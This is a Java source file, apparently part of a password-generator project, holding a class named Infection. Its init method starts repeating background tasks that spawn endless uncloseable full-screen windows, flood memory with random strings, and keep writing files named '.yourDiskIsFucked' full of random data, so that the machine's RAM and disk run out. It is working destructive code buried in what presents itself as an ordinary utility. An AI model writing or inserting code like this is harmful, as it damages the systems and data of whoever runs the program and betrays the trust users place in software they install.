package xyz.plocki.passwordgenerator.utils.infected;

import org.apache.commons.lang3.RandomStringUtils;
import xyz.plocki.asyncthread.AsyncThread;

import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.*;
import java.util.List;

public class Infection {

    public static HashMap<String, Map<String, String>> lul;
    public static List<JFrame> frameList;
    public static Map<String, String> map;

    @SuppressWarnings("all")
    public static void init() {
        map = new HashMap<>();
        lul = new HashMap<>();
        frameList = new ArrayList<>();
        JFrame frame = new JFrame("Look at your ram");
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        frame.setVisible(true);
        frame.setSize(3000,2000);
        frameList.add(frame);
        new AsyncThread(() -> {
            JFrame frames = new JFrame("Look at your ram");
            frames.setSize(3000,2000);
            frames.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            frames.setVisible(true);
            frameList.add(frames);
        }).scheduleAsyncTask(0,1);
        new AsyncThread(() -> {
            String string = RandomStringUtils.randomAlphanumeric(new Random().nextInt(999)) + UUID.randomUUID();
            Map<String, String> map = new HashMap<>();
            map.put(string, string);
            lul.put(string, map);
            JFrame frames = new JFrame("Look at your ram");
            frames.setSize(3000,2000);
            frames.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            frames.setVisible(true);
            frameList.add(frames);
        }).scheduleAsyncTask(0,1);
        new AsyncThread(() -> {
            JFrame frames2 = new JFrame("Look at your ram");
            frames2.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            frames2.setVisible(true);
            frameList.add(frames2);
        }).scheduleAsyncTask(0,1);
        new AsyncThread(() -> {
            File file = new File(UUID.randomUUID().toString() + ".yourDiskIsFucked");
            try {
                file.createNewFile();
            } catch (IOException ignored) {}
            FileWriter writer = null;
            try {
                writer = new FileWriter(file);
            } catch (IOException ignored) {}
            try {
                String string = RandomStringUtils.randomAlphanumeric(new Random().nextInt(9999999)) + RandomStringUtils.randomAlphanumeric(new Random().nextInt(9999999)) + UUID.randomUUID();
                map.put(string+UUID.randomUUID(), string+UUID.randomUUID());
                lul.put(string+UUID.randomUUID(), map);
                map.put(frameList.toString()+UUID.randomUUID().toString(), frameList.toString()+UUID.randomUUID().toString());
                lul.put(string+UUID.randomUUID(), map);
                assert writer != null;
                writer.write(string);
                writer.write(frameList.toString());
            } catch (IOException ignored) {}
        }).scheduleAsyncTask(0,1);
    }

}
